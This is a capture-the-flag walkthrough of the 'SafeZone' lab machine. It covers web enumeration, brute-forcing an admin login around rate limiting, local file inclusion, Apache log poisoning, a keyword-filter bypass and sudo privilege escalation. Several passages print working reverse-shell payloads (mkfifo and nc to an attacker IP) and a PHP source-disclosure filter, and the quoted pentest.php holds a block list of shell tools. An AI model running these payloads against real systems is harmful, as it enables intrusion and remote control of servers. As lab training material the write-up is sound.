This was a fun, but difficult room. I spent many days on it, especially on getting the initial foothold. I required lots of enumeration and exploiting different types of vulnerabilities.

## Enumeration

I started the room by adding the IP to my hosts file and using RustScan to enumerate the opened ports.

```bash
$ rustscan -a target  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

There was two opened ports, 22 (SSH) and 80 (HTTP). So I went directly to the web site.

## Web Site

I opened a web browser and navigate to the [site](http://target.thm/). There was nothing to see there.

![Main Page](/assets/images/2021/07/SafeZone/MainSite.png "Main Page")

I looked at the response in Burp, there was nothing hidden in the headers or the source code. So I launched Gobuster to look for hidden pages.

```

It found that there are two index files. By default, the site served the `index.html`. So I looked at [index.php](http://target.thm/index.php). 

![Login Form](/assets/images/2021/07/SafeZone/IndexDotPHP.png "Login Form")

I tried login using admin/admin. It did not work, and the site did not give information about the user existing or not. 

However, it showed that there was rate limiting implemented on the login. 

![2 attempts remaining](/assets/images/2021/07/SafeZone/2AttemptsRemaining.png "2 attempts remaining")

After two more tries, I got a message saying I was blocked for 60 seconds. 

![Blocked](/assets/images/2021/07/SafeZone/Blocked.png "Blocked")

I would not be able to brute force that login form. Unless I find a way around the rate limiting. 

Now that I knew the site used PHP, I launched Gobuster again. This time I looked for PHP and text files.

```

The first thing I looked at was the [note.txt file](http://target.thm/note.txt). 

> Message from admin :-
>
> I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .

Apparently a password is hidden in a file. But I had no access to it at this moment. 

There was a [register](http://target.thm/register.php) page. I created a new user and used it to connect to the site.

![Dashboard](/assets/images/2021/07/SafeZone/Dashboard.png "Dashboard")

Now that I was connected, I started looking around the site.

The [news page](http://target.thm/news.php) displayed a message about a possible [Local File Inclusion (LFI)](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) or [Remote Code Execution (RCE)](https://en.wikipedia.org/wiki/Arbitrary_code_execution) vulnerability. 

> ## I have something to tell you , it's about LFI or is it RCE or something else?

The [details pages](http://target.thm/detail.php) displayed a message about a feature being disabled. It looked like I might need an admin account to use it. 

![Details Page](/assets/images/2021/07/SafeZone/DetailsPage.png "Details Page")

In the page source code, a comment had an hint about a 'page' parameter that might help me. 

```html
<!-- try to use "page" as GET parameter-->
```

I tried using the parameter for LFI. I tried reading the [password file](http://target.thm/detail.php?page=/home/files/pass.txt) mentioned in the note. But the parameter did not seem to do anything.  

I also tried fuzzing this parameter, and other parameters. But I did not find anything interesting. 

```bash
$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 92 -t10 "http://target.thm/detail.php?page=FUZZ"

$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 92 -t10 "http://target.thm/detail.php?FUZZ=1"
```

## Admin Access 

I got stuck here for a few days. Only when I tried looking for hidden page with different lists than the two I normally use did I found something new. I really need to take all the unique words from those lists and combine them into one file.

```bash

```

I looked at the [/~files/](http://target.thm/~files/) folder Gobuster found. Directory indexing was on and it showed the [pass.txt](http://target.thm/~files/pass.txt) file mentioned in the earlier note. 

![~files](/assets/images/2021/07/SafeZone/IndexOfFiles.png "~files")

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

So the admin password was two times the word admin with two digits in between. That's gave me only 100 possibilities to brute force. 

I wrote a small Python script to generate all the numbers from 0 to 99. 

```python
for i in range(100):
    print("{:02d}".format(i))
```

And then I used wfuzz to try them all. However I still had the rate limiting issue to deal with. I first tried to wait 30 seconds between attempts, using the `-s` parameter. But that was too slow. Since I had three attempts before getting blocked for 60 seconds I thought I might get away with 20 seconds wait.

```bash
$ python generateNumbers.py > numbers.txt

$ wfuzz -c -z file,numbers.txt -t1 -s 20 -d "username=admin&password=adminFUZZadmin&submit=Submit" "http://target.thm/index.php"

```

I used the password I found to connect as admin and went back to the details page. 

![Details As Admin](/assets/images/2021/07/SafeZone/DetailsAsAdmin.png "Details As Admin")

## Getting a Shell

The details page allowed me to run queries on the users. 

![whoami](/assets/images/2021/07/SafeZone/AdminWhoami.png "whoami")

I tried to do SQL Injection and command injection here, but it did not work. Then I remember the comment about the `page` parameter. I tried to load the index.html file with it and this time it worked. 

![LFI](/assets/images/2021/07/SafeZone/LFI.png "LFI")

Next I tried loading the [`/etc/passwd`](http://target.thm/detail.php?page=/etc/passwd) file.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```

This told me there was two users on the server: 'yash' and 'files'. I tried them in the Details page. 

![Yash](/assets/images/2021/07/SafeZone/YashWhoami.png "Yash")

The user files was not found. But yash was using their username as password. I used those credentials to log to the application. But that didn't give me anything more. I tried it to connect through SSH, but it failed.

Next, I used the LFI vulnerability to read the PHP files has base64. I couldn't include them like I did with the other files, because the PHP code would be executed and I would get the result of the execution, not the source code. But I was able to use PHP stream filters to get the code as base64.

Going to [http://target.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php](http://target.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php) gave me a long string, that I saved to a file and decoded to get the original code. 

```bash
$ cat detail.b64 | base64 -d > detail.php 
```

```php
<?php
$con=mysqli_connect("localhost","root","myrootpass","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
		$page=$_GET["page"];
		$file = str_replace(array( "../", "..\"" ), "", $page );
		echo $file;
		include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
	{
		$sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
		$det=json_encode($details);
		echo "<pre style='color:red;font-size:14px'>$det</pre>";
		$msg="Details are saved in a file";
		echo "<script>alert('details saved in a file')</script>";
	}
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}

?>
```

In the code, I could see that it read the users from the database. The username is escaped with `mysqli_real_escape_string` so it was not vulnerable to SQLi. 

The code was also doing an `include` of any file from the `page` parameter. So I tried to load the Apache access log to see if the page was vulnerable to [log poisoning](https://owasp.org/www-community/attacks/Log_Injection). 

I loaded [http://target.thm/detail.php?page=/var/log/apache2/access.log](http://target.thm/detail.php?page=/var/log/apache2/access.log) and the Apache logs were returned with the page.

```

With that, I could change my request user agent to some PHP code and it would get executed on the second request. The first one to write it in the log file, and the second to execute it when the file would be included. 

I started a netcat listener and then used Burp Repeater to modify the user agent and send the request twice. 

```http
GET /detail.php?page=/var/log/apache2/access.log HTTP/1.1
Host: target.thm
User-Agent: <?php `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`; ?>

Accept-Encoding: gzip, deflate

Cookie: PHPSESSID=enaad3ebffto4lbui8og7pvlkb

```

On the second request, I had my reverse shell. 

```bash
$ nc -lnvp 4444

## Privilege Escalation to files

Once connected, I used Python to stabilize my shell. 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm

And then I started looking around on the server. The home folder for the user files was readable. I contained the password hint I had found earlier and password hash for the user files. 

```bash
www-data@safezone:/home$ ls -la /home/files/

I launched hashcat to try to crack the password.

```bash

It found the password quickly, but I was still looking around the server for ways to escalate. The user www-data was allowed to run `find` as files. 

```bash
www-data@safezone:/home$ sudo -l
Matching Defaults entries for www-data on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
```

I looked on GTFOBins, and it gave me an easy way to [escalate to files](https://gtfobins.github.io/gtfobins/find/#sudo). 

```
www-data@safezone:/home$ sudo -u files find . -exec /bin/sh \; -quit
$ whoami
files
```


## Privilege Escalation to yash

After I connected as files, I try looking for ways to escalate my privileges again. I check for sudo permissions. They could run `id` as yash. But this didn't look really useful. 

```bash
files@safezone:~$ sudo -l
Matching Defaults entries for files on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id

files@safezone:~$ sudo -u yash id
uid=1000(yash) gid=1000(yash) groups=1000(yash),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),114(sambashare)
```

I looked around the server for a while. When I looked for opened ports locally I found a second web application on port 8000.


```bash
files@safezone:~$ ss -l
Netid  State    Recv-Q   Send-Q                                   Local Address:Port                                            Peer Address:Port               
...
tcp    LISTEN   0        128                                          127.0.0.1:8000                                                 0.0.0.0:*                  
```

I tried to get the site, but it was not accessible. 

```bash
files@safezone:~$ curl localhost:8000
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

I opened a SSH tunnel to be able to interact with this page from my machine.

```bash
ssh -L 8000:localhost:8000 files@target
```

Then I could use Gobuster to look for hidden pages.

```bash
$ gobuster dir -e -u http://localhost:8000/ -t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -xtxt,php

```

There was only one page opened, [pentest.php](http://localhost:8000/pentest.php). 

![pentest.php](/assets/images/2021/07/SafeZone/Pentest.png "pentest.php")

The page requested a message to send to Yash and echoed it back to me. I played with the message for a while, trying to send commands to the server. From what the page returned me, it was clear that many things were stripped out from the message I sent. 

* php
* nc
* (
* )
* &
* \`

For things like php and nc, I found that if I double them, they would not be completely stripped. 

Sending 
```
<?pphphp system('mkfifo /tmp/kirxhbg; nncc 10.13.3.36 4444 0</tmp/kirxhbg | /bbinin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg'); ?>
```

Returned
```
<?php system'mkfifo /tmp/kirxhbg nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>1 rm /tmp/kirxhbg' ?>
```

But I could not do this for single characters like &. And I did not get a reverse shell with this. 

Also, I did not know if the message I was sending was being executed on the server. And if it was, did I need to pass PHP, or Bash commands?

I tried creating a file where I would be able to read it to see if bash commands worked.

I tried sending this message:
```
touch /home/files/test
```

Then looked in files home folder. The file was there. 
```bash
files@safezone:~$ ls -l /home/files
total 4
-rwxrwxrwx 1 root root 112 Jan 29 10:24 pass.txt
-rw-r--r-- 1 yash yash   0 Jul 27 15:53 test
```

Now that I knew that Bash command worked, I used it to copy pentest.php where I would be able to read it. 

```bash
cp pentest.pphphp /home/files
```

Nothing surprising in the file. It takes the message sent, remove a bunch of things and then execute it.

```php
<?php

if(isset($_POST['btn']))
{
$substitutions = array(
		'&&' => '',
		';'  => '',
		'bash' => '',
		'tcp' => '',
		'dev' => '',
		'php' => '',
		'python' => '',
		'python3' => '',
		'socat' => '',
		'perl' => '',
		'ruby' => '',
		'nc' => '',
		'ncat' => '',
		'Run' => '',
		'powershell' => '',
		'&'  => '',
		';'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
		'bin' => '',
		'id' => '',
		'whoami' => ''
	);


$msg=$_POST['msg'];
$target = str_replace( array_keys( $substitutions ), $substitutions, $msg );
echo "<pre style='color:red'>$target</pre>";
shell_exec($target);
}
?>
```

Next I tried to create a PHP reverse shell in files home folder.

```bash
files@safezone:~$ cat shell.php 
<?php
`mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`;

```

And then use this message to copy it in the web root so I could execute it. 
```
cp /home/files/shell.pphphp /opt/
```

But the web server was running as yash and they were not allowed to write to `/opt` so that failed. 

But since it was running as yash, it meant I could use it to write into yash home folder. I created a file `/home/files/authorized_keys` with my public key. And then used the web page to copy it in `/home/yash/.ssh/`.

```
mkdir ~/.ssh

cp /home/files/authorized_keys /home/yash/.ssh/

chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

When this was done, I was able to connect as yash with SSH and finally get the first flag.

```bash
$ ssh yash@target

## Escalation to root

As always, I started looking at sudo permission. 

```
$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

yash was able to run some backup script as root. I tried the script. It requested a filename, a destination, and a password. I tried using it to copy a file to yash's home folder and it worked. 

```
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py

Since it ran as root, I used it to copy the flag.

This room took me a long time to complete. I got stuck a few times, but I had lots of fun doing it.
